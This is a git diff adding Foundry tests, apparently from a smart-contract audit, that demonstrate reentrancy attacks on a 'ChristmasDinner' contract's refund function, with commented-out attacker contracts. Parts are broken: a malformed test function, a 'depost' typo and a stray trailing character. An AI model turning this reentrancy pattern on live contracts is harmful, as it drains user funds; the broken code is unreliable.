@@ -262,4 +262,127 @@ contract ChristmasDinnerTest is Test {
         usdc.approve(address(cd), 2e18);
         vm.stopPrank();
     }
+
+    function test_reEnterAttack() public {
+        vm.warp(1 + 3 days);
+
+        vm.startPrank(user1);
+        cd.deposit(address(wbtc), 1e18);
+        vm.stopPrank();
+
+        vm.startPrank(user2);
+        cd.deposit(address(weth), 2e18);
+        vm.stopPrank();
+
+        vm.startPrank(user3);
+        vm.deal(user3, 5e18);
+        cd.deposit(address(wbtc), 2e18);
+
+        address(cd).call{value: 5e18}("");
+        vm.stopPrank();
+    
+        assertEq(weth.balanceOf(address(cd)), 2e18);
+        assertEq(wbtc.balanceOf(address(cd)), 3e18);
+
+
+        reEnterAttacker attacker = new reEnterAttacker(cd, wbtc);
+        wbtc.mint(address(attacker), 1e18);
+
+        console.log("WBTC balance of contract before attack: ", wbtc.balanceOf(address(cd)));
+        console.log("WBTC balance of attacker before attack: ", wbtc.balanceOf(address(attacker)));
+
+
+        attacker.attack();
+
+
+        console.log("WBTC balance of contract after attack: ", wbtc.balanceOf(address(cd)));
+        console.log("WBTC balance of attacker after attack: ", wbtc.balanceOf(address(attacker)));
+
+     
+    }
 }
+
+function test_UncheckedSentEth public {
+    vm.warp(1 + 3 days);
+
+    // vm.startPrank(user1);
+    // cd.deposit(address(wbtc), 1e18);
+    // vm.stopPrank();
+
+    // vm.startPrank(user2);
+    // cd.deposit(address(weth), 2e18);
+    // vm.stopPrank();
+
+    // vm.startPrank(user3);
+    // vm.deal(user3, 5e18);
+    // cd.deposit(address(wbtc), 2e18);
+
+    // address(cd).call{value: 5e18}("");
+    // vm.stopPrank();
+    
+    // assertEq(weth.balanceOf(address(cd)), 2e18);
+    // assertEq(wbtc.balanceOf(address(cd)), 3e18);
+
+    vm.makeAddr("BadUser");
+
+    vm.startPrank("BadUser");
+
+    cd.depost{value: 0.5e18}(wbtc, 0.1e18);
+
+
+
+
+
+
+}
+
+// contract MaliciousWBTC is ERC20Mock {
+//     ChristmasDinner public cd;
+//     address public attacker;
+
+//     constructor(ChristmasDinner _cd, address _attacker)
+//         ERC20Mock("MaliciousWBTC", "mWBTC")
+//     {
+//         cd = _cd;
+//         attacker = _attacker;
+//     }
+
+//     // Override transfer so that when tokens are sent to the attacker,
+//     // it reenters the refund function before the balance is zeroed.
+//     function transfer(address to, uint256 amount) public override returns (bool) {
+//         // When sending tokens to the attacker, reenter the refund
+//         if (to == attacker) {
+//             // Reenter the refund call (this call now isn’t limited by a 2300-gas stipend)
+//             cd.refund();
+//         }
+//         return super.transfer(to, amount);
+//     }
+// }
+
+// contract reEnterAttacker  {
+
+//         ChristmasDinner cd;
+//         ERC20Mock  wbtc;
+
+
+//         constructor(ChristmasDinner _cd, ERC20Mock _wbtc) {
+//             cd = _cd;
+//             wbtc = _wbtc;
+//             wbtc.approve(address(cd), type(uint256).max);
+
+//         }
+
+//         fallback() external payable{
+//            if (wbtc.balanceOf(address(cd)) > 1e18) {
+//                 cd.refund();
+//             }
+//         }
+
+
+//         function attack() public{
+//             cd.deposit(address(wbtc), 1e18);
+//             cd.refund();
+//         }
+//     }
+
+c
